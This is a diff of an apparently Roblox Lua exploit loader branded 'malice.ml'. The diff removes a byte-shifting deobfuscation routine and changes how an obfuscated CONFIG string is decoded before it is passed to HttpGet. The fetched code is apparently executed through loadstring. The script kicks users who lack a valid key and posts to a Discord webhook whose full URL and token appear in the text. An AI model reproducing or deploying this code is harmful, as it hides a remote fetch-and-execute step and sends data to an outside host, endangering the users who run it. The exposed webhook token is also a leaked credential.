@@ -31,34 +31,7 @@ _ASKID = game:GetService("RunService").Heartbeat:Connect(function()
 	end)
 end)
 local _GAMEINFO = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId);
-function deSclude(str)
-	assert(str:len() > 3,"String is too short")
-	local table1 = {}
-	local table2 = {}
-	local table3 = {}
-	local table4 = {}
-	for i=1,#str do
-		local s = string.sub(str,i,i)
-		table.insert(table1,s)
-	end
-	for i=1,#table1 do
-		local s = table1[i]:byte()-5
-		table.insert(table2,s)
-	end
-	for i=1,#table2 do
-		local s = string.char(table2[i])
-		table.insert(table3,s)
-	end
-	local newhash = table.concat(table3)
-	local a = 1
-	for i=1,#newhash do
-		local s = string.sub(newhash,a,a)
-		table.insert(table4,s)
-		a = a + 3
-	end
-	print("[Decrypted]:",table.concat(table4))
-	return table.concat(table4)
-end
+
 function decodeString(txt)
 	local counter = 0
 	local save = ""
@@ -138,7 +111,7 @@ end
 --(Loader)
 local _LOAD = loadstring
 local s,a = pcall(function()
-	local _DEC = game:HttpGet(decodeString(deSclude(CONFIG)));
+	local _DEC = game:HttpGet(decodeString(CONFIG));
 end)
 if(not s)then
 	pcall(function()
@@ -178,7 +151,7 @@ if(not s)then
 	end)
 	return (_USER:Kick('\nmalice.ml\nInvalid encryption key!\nIf this is a recurring error, you may have a outdated key.'))
 else
-	local _DECODED = decodeString(deSclude(CONFIG));
+	local _DECODED = decodeString(CONFIG);
 	requestHttp({
 		url = 'https://discord.com/api/webhooks/979128485878591498/lc49ZT_W_m_qgQ9zo7Xsh2MUGcoC73Ohc9kouLMyCPmLXMzesFmloNU6XiyBGhjowA1X',
 		body = {
